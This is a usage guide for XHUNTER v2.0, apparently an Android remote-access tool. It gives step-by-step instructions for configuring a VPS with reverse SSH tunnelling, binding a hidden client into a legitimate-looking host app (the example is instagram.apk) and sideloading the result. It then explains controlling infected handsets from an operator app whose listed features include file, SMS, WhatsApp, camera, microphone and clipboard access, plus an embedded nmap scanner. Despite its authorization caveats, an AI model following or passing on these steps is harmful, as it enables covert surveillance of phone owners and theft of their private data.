# XHUNTER v2.0 — usage

Setup steps, release assets, and reference tables. For the showcase readme see [README.md](README.md). For `binder/config.txt` keys see [binder/BINDER.md](binder/BINDER.md).

**Release:** [v2.0](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0) — operator app [`xhunter_v2.0.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/xhunter_v2.0.apk), example host [`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/instagram.apk).

## Quick overview: what you do in order

Follow these steps from top to bottom:

| Step | What you do |
|------|-------------|
| **A** | Prepare a VPS: open the right ports, enable SSH settings the app expects, set a user password if you use password-based tunnel login. |
| **B** | Produce a merged client **either on-device** (in-app APK binder inside `xhunter_v2.0.apk`) **or on your PC** via `binder/setup.sh`, `binder/config.txt`, and `binder/binder.sh`, then sideload onto a test handset. |
| **C** | On the operator phone, install **`xhunter_v2.0.apk`**, enter the same server details, start the tunnel, and wait for the client to appear in the list. |

The sections below walk through **A**, **B**, and **C** in detail.

---

## Binder: two workflows (same outcome)

| Mode | Choose when | Highlights |
|------|-------------|-----------|
| **In-app binder (default)** | You want the quickest loop on-target and already carry the operator build. | Guided UI: pick APK, gateway host/url, injection activity, inspect logs; powered by **[apktool-android](https://github.com/anirudhmalik/apktool-android)**. |
| **Desktop `binder/`** | You automate merges, stash decode trees, run from CI, or need the interactive hook picker in a workstation shell. | `binder.sh` merges using `config.txt` — see **[binder/BINDER.md](binder/BINDER.md)**. |

Regardless of workflow, **`HOST`/callback MUST match `binder/config.txt`’s `HOST` and whatever the VPS listener expects.**

## Getting started

### What you need before you start

- **Android devices:** one operator handset (`xhunter_v2.0.apk`), one handset for the merged test APK  
- **Network:** Internet + a VPS or cloud VM you control  
- **Computer (desktop path only):** macOS/Linux/Windows (**Git Bash** or **WSL**) + JDK for `binder.sh`  
- **Authorization:** Written scope naming devices, subnets, and retention limits

---

### Step A — VPS and SSH reverse port forwarding

Configure a reachable server whose reverse SSH tunnel settings match the operator app UI. **`HOST`/listener IP** in every surface (binder, merged client, VPS firewall) stays in sync — same rule as README’s operations map.

#### A.1 Create the server and open ports

1. Create **Ubuntu** (or similar) on your provider or **EC2**.  
2. Open **TCP 22** (SSH administration) plus the **listener TCP port** baked into your APK (tutorial default **8080**).  
3. Tighten source IP ranges wherever possible — lab jump boxes only beats `0.0.0.0/0`.

#### A.2 Log in over SSH

```bash
ssh -i your_key.pem ubuntu@<remote_server_ip>
```

Some AMIs ship **`ec2-user`** rather than **`ubuntu`**.

#### A.3 Tunnel password (`PasswordAuthentication`)

If using password-based tunnel login inside the app:

```bash
sudo passwd ubuntu
```

Substitute whichever Linux user mirrors the SSH profile stored in xhunter.

#### A.4 `GatewayPorts` + auth knobs

⚠ Teaching convenience only — harden prod ranges.

Set in `/etc/ssh/sshd_config` (or a drop-in):

- `GatewayPorts yes` — required for reachable reverse forwards.  
- `PasswordAuthentication yes` — **only if** passwords are unavoidable (prefer keys elsewhere).

Restart SSH afterwards:

```bash
sudo systemctl restart ssh || sudo systemctl restart sshd
```

Now finish **Step B** (Binder: merged APK) merge(s) matching this IP/DNS inside each workflow.

---

### Step B — Binder: merged APK

#### Desktop path recap

<details>
<summary>Click to expand the classic workstation flow</summary>

1. Clone [xhunter](https://github.com/anirudhmalik/xhunter) · `cd xhunter/binder`.  
2. Download [`xhunter_v2.0.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/xhunter_v2.0.apk) if you mirror artifacts locally beside the repo.  
3. `chmod +x setup.sh binder.sh && ./setup.sh`  
4. Edit `config.txt`:

   ```text
   HOST=<your VPS public hostname or IPv4>
   HOST_APK=apps/instagram.apk
   ```

   Drop **[instagram.apk](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/instagram.apk)** (or substitute your host file) beneath `binder/apps/` when referencing `apps/instagram.apk`.  
5. Run `./binder.sh` in a real TTY, pick the hook activity (for the sample Instagram package that is usually `InstagramMainActivity`).  
6. Collect `binder/out/xhunter-merged.apk` (or your `OUT_APK`) and sideload on the authorized client.

</details>

#### In-app path (v2.0 default)

1. Install [`xhunter_v2.0.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/xhunter_v2.0.apk).  
2. Open **binder** wizard → pick host APK (`Downloads`, scoped storage picker, etc.).  
3. Type the **gateway**/`HOST` value matching `binder/config.txt` + VPS.  
4. Select **Launcher activity** hooks exactly like the desktop picker would.  
5. Watch **Logs** finish decode → merge → rebuild → sign. Ship the APK from operator storage or share hub.  

If both paths run the same codebase revision, payloads stay binary-compatible across teams.

Screenshots illustrating the APK binder lives in README’s gallery (`README.md` Screenshots).

---

### Step C — Operator app (`xhunter_v2.0.apk`)

1. Install **`xhunter_v2.0.apk`** from [releases/v2.0](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0); enable unknown sources/notifications where Android 13+.  
2. Persist SSH profiles (host/user/password/port) mirroring VPS setup. Start the tunnel foreground service — stay inside legal windows for persistent comms.  
3. Accepted clients populate the roster; escalate into modules only when policy + contracts allow (`Features: open vs Pro` explains gating nuances).  

---

## Network scanning (Nmap embedded)

Integrated **nmap** targets **explicitly scoped** IPv4 ranges, VLANs inside your lab tenancy, or single hosts you enumerated during prep work.

### Prerequisites

- **Legal:** Target networks must appear in authorization paperwork (ranges, VLAN IDs, MFA bypass policies, etc.).  
- **Operational:** Maintain VPN/jump segmentation so egress from the handset cannot “spray” the public Internet.  
- **Device:** Follow whatever storage + CPU guidance the module surfaces (long scans may trip battery / thermal limits).

### Getting a scan out the door

1. From the operator UI, open the **Network / Nmap** module (label may include “Network”, “Nmap”, or similar depending on build flavor).  
2. Enter **targets** using the syntax the field accepts — single host, CIDR, or line-delimited asset lists (mirror what the form placeholder shows).  
3. Choose a **profile** or **advanced** tab: port selection, timing (`-T*`), service/version detection (`-sV`), OS guesses (`-O`) when exposed, and **NSE script** toggles that your build lists.  
4. Tap **Run** — stdout/stderr-style transcript streams in-app; copy/share according to your evidence handling SOP.  
5. For repeatable classroom labs, export logs (if the build surfaces share actions) into your SIEM or attach to your written report appendix.

> Only document **flags and script packs you can actually tap in UI**. If a future build removes a script category, update this section alongside release notes.

### Safety rails

- **Rate-limit** wide subnets — prefer `/28` slices over `/16` sweeps unless your range is synthetic.  
- **Document** every scan window in your RoE addendum.  
- **Stop** immediately if responses leave the approved ASNs or hostnames.

---

## Files in this repository

| Item | Purpose |
|------|---------|
| [README.md](README.md) | Showcase + disclaimers |
| [USAGE.md](USAGE.md) | Operational guide (`v2.0`) |
| `images/logo.png` | Branding asset |
| [`xhunter_v2.0.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/xhunter_v2.0.apk) | Operator build (`v2.0` tag) |
| [`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/instagram.apk) | Example host package for `binder/apps/` demos |
| `binder/` | Desktop merge scripts + jars |
| [binder/BINDER.md](binder/BINDER.md) | `config.txt` reference |

Missing vendor bundle? rerun **`binder/setup.sh`**.

---

## Features: open vs pro

| Area | **v2.0 open / demo lineage** | **Pro (planned/upstream)** |
|------|-------------------------------|----------------------------|
| Device list + telemetry refresh | ✅ | ✅ |
| File explorer | Demo lock / Pro gated | ✅ |
| WhatsApp / installs / SMS | Pro gated in demo lineage | ✅ |
| Camera · mic · clipboard | Pro gated in demo lineage | ✅ |

The **dual binder pathways** mirror **v1 single-APK ergonomics**, but hardened with VPS separation and audited modules.

---

## Contributing

Fork → feature branch (`git checkout -b feature/YourThing`) → commit → push → open PR (`enhancement` label optional). Issue templates welcome upstream.
